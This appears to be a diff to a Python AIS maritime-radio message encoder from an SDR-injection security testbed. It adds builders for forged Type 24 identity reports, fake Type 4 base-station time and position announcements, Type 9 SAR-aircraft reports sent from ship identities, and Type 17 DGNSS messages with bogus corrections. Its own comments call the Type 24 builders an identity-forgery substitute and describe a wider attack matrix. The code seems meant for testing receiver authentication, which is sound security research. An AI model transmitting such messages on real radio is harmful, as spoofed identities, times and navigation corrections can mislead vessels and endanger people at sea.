@@ -105,6 +105,52 @@ def encode_type5_static(mmsi, callsign="", shipname="", shiptype=0):
     return b
 
 
+def _sixbit_str(s, nchars):
+    """6-bit ASCII, space/'@'-padded to nchars -- shared by Type 5 and Type 24 string fields."""
+    s = (s.upper() + "@" * nchars)[:nchars]
+    table = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ !\"#$%&'()*+,-./0123456789:;<=>?"
+    out = ""
+    for ch in s:
+        idx = table.find(ch)
+        out += _bits(idx if idx >= 0 else 0, 6)
+    return out
+
+
+def encode_type24_a(mmsi, shipname=""):
+    """Type 24 Part A (static data report): 168 bits, ONE slot. Carries just the ship name.
+    Use this + encode_type24_b as a drop-in identity-forgery substitute for Type 5: Type 5 is
+    424 bits (2 slots) and this testbed's SDR injector only reliably transmits single-slot
+    bursts, so Type 5 never actually reaches the air intact (confirmed: 0/0/0/0/0 Type-5
+    sentences across every run and vendor, including the independent listener SDR). Type 24
+    carries the same identity fields split across two single-slot messages by design, so it
+    exercises the same "does the unit accept an unverified identity claim" question without
+    depending on multi-slot support."""
+    b = ""
+    b += _bits(24, 6); b += _bits(0, 2); b += _bits(mmsi, 30)
+    b += _bits(0, 2)                       # part number = 0 (Part A)
+    b += _sixbit_str(shipname, 20)         # vessel name (20 chars, 120 bits)
+    b += _bits(0, 8)                       # spare
+    assert len(b) == 168, f"Type24A must be 168 bits, got {len(b)}"
+    return b
+
+
+def encode_type24_b(mmsi, callsign="", shiptype=0):
+    """Type 24 Part B (static data report): 168 bits, ONE slot. Carries call sign + ship type
+    (+ zeroed vendor/model/serial/dimensions). See encode_type24_a for why this replaces Type 5."""
+    b = ""
+    b += _bits(24, 6); b += _bits(0, 2); b += _bits(mmsi, 30)
+    b += _bits(1, 2)                       # part number = 1 (Part B)
+    b += _bits(shiptype, 8)
+    b += _sixbit_str("", 3)                # vendor ID (3 chars, 18 bits) -- zeroed
+    b += _bits(0, 4)                       # unit model code
+    b += _bits(0, 20)                      # serial number
+    b += _sixbit_str(callsign, 7)          # call sign (7 chars, 42 bits)
+    b += _bits(0, 9) + _bits(0, 9) + _bits(0, 6) + _bits(0, 6)   # dimensions to bow/stern/port/stbd
+    b += _bits(0, 6)                       # spare
+    assert len(b) == 168, f"Type24B must be 168 bits, got {len(b)}"
+    return b
+
+
 # ----------------------------------------------------------------------------
 # Command / addressed / binary message builders (ITU-R M.1371).
 # These enable the SDR-injection attack matrix: interrogation, assignment,
@@ -251,6 +297,64 @@ def encode_type22(src_mmsi, channel_a=2087, channel_b=2088, tx_rx=0, power=0,
 # framing-level ones (bad CRC, truncated frame) are noted where they need the raw
 # modulator path instead of the framing backend.
 # ----------------------------------------------------------------------------
+def encode_type4(mmsi, lat, lon, year=2026, month=1, day=1, hour=0,
+                 minute=0, second=0, epfd=7):
+    """Type 4 base-station report (168 bits, single slot). Carries the base's claimed
+    UTC and position -- receivers may use it for time sync and to establish a base cell.
+    Set a ship-format MMSI + false time/position to test whether a unit trusts an
+    unauthenticated base announcement (INV-B-AUTH-02)."""
+    b = ""
+    b += _bits(4, 6); b += _bits(0, 2); b += _bits(mmsi, 30)
+    b += _bits(year, 14); b += _bits(month, 4); b += _bits(day, 5)
+    b += _bits(hour, 5); b += _bits(minute, 6); b += _bits(second, 6)
+    b += _bits(1, 1)                                # fix quality
+    b += _bits(int(round(lon * 600000.0)), 28)      # longitude (signed)
+    b += _bits(int(round(lat * 600000.0)), 27)      # latitude  (signed)
+    b += _bits(epfd, 4); b += _bits(0, 10)          # EPFD + spare
+    b += _bits(0, 1); b += _bits(0, 19)             # RAIM + radio status
+    assert len(b) == 168, f"Type 4 must be 168 bits, got {len(b)}"
+    return b
+
+
+def encode_type9(mmsi, lat, lon, sog=0.0, cog=0.0, altitude=1000, timestamp=60):
+    """Type 9 SAR-aircraft position report (168 bits, single slot). The standard reserves
+    Message 9 for SAR aircraft; sending it from an ordinary ship MMSI tests station-class
+    enforcement (INV-B-AUTH-03)."""
+    b = ""
+    b += _bits(9, 6); b += _bits(0, 2); b += _bits(mmsi, 30)
+    b += _bits(min(int(altitude), 4095), 12)        # altitude (m)
+    b += _bits(min(int(round(sog)), 1022), 10)      # SOG (integer kn for SAR)
+    b += _bits(1, 1)                                # position accuracy
+    b += _bits(int(round(lon * 600000.0)), 28)      # longitude (signed)
+    b += _bits(int(round(lat * 600000.0)), 27)      # latitude  (signed)
+    b += _bits(int(round(cog * 10.0)), 12)          # COG
+    b += _bits(timestamp, 6)                        # UTC second
+    b += _bits(0, 8)                                # reserved / regional
+    b += _bits(0, 1); b += _bits(0, 3)             # DTE + spare
+    b += _bits(0, 1); b += _bits(0, 1)             # assigned + RAIM
+    b += _bits(0, 20)                              # radio status
+    assert len(b) == 168, f"Type 9 must be 168 bits, got {len(b)}"
+    return b
+
+
+def encode_type17(mmsi, lat, lon, data_bits=None):
+    """Type 17 DGNSS broadcast (single slot). Header carries the reference position in
+    1/10-minute units; the payload carries differential corrections. Sending it from an
+    ordinary MMSI with bogus corrections tests whether a unit consumes unauthenticated
+    DGNSS data and lets an attacker shift computed fixes (INV-B-AUTH-02)."""
+    if data_bits is None:
+        data_bits = "1" * 40                        # bogus correction payload
+    lon_u = int(round(lon * 600.0))                 # deg -> 1/10 minute
+    lat_u = int(round(lat * 600.0))
+    b = ""
+    b += _bits(17, 6); b += _bits(0, 2); b += _bits(mmsi, 30); b += _bits(0, 2)
+    b += _bits(lon_u, 18)                            # longitude (signed, 1/10 min)
+    b += _bits(lat_u, 17)                            # latitude  (signed, 1/10 min)
+    b += _bits(0, 5)                                 # spare
+    b += data_bits
+    return b                                         # <= 168 bits, single slot
+
+
 def encode_type1_raw(mmsi, lat, lon, sog_u=None, cog_u=None, heading=511,
                      nav_status=0, rot=128, timestamp=60, spare=0):
     """Type 1 with RAW field values (no unit conversion) so you can inject illegal
